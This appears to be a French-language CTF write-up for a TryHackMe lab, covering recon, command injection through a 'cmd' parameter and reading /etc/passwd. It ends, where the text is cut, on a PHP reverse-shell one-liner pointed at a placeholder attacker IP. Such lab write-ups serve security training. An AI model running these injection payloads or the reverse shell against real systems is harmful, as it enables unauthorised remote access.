# My Hero Academia - TryHackMe Write-up

## 🎯 Objectif
Ce dépôt documente la résolution d'un challenge CTF. L'objectif est d'obtenir un accès initial via une injection de commande (RCE), de réparer un fichier image corrompu pour en extraire des données (Stéganographie), et d'escalader les privilèges vers **root** en exploitant un script de feedback mal sécurisé pour manipuler le fichier `/etc/passwd`.

**Compétences démontrées :**
* **Reconnaissance Web** (Fuzzing & Command Injection).
* **Forensics** (Réparation de Magic Numbers & Stéganographie).
* **Mouvement Latéral** (SSH avec credentials extraits).
* **Escalade de Privilèges** (Bypass de filtres & écriture arbitraire dans `/etc/passwd`).

---

## 🔍 1. Reconnaissance & Accès Initial

### Scan & Découverte
Un scan Nmap révèle les ports **22 (SSH)** et **80 (HTTP)**.
L'exploration du site web ne donne rien, mais un fuzzing de répertoires (Gobuster) nous mène vers `/assets`, puis vers `/assets/index.php`.

### Command Injection (RCE)
Nous découvrons que `index.php` est vulnérable à une injection de commande via le paramètre `cmd`.
* Payload de test : `http://.../assets/index.php?cmd=ls` -> Liste les fichiers.
* Énumération : `?cmd=cat /etc/passwd` -> Nous identifions l'utilisateur **deku**.

### Reverse Shell
Pour obtenir un shell interactif, nous utilisons un one-liner PHP. Comme l'injection se fait via URL, nous devons encoder le payload (URL Encode).

**Payload (non encodé) :**
```php
php -r '$sock=fsockopen("IP_ATTACK",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
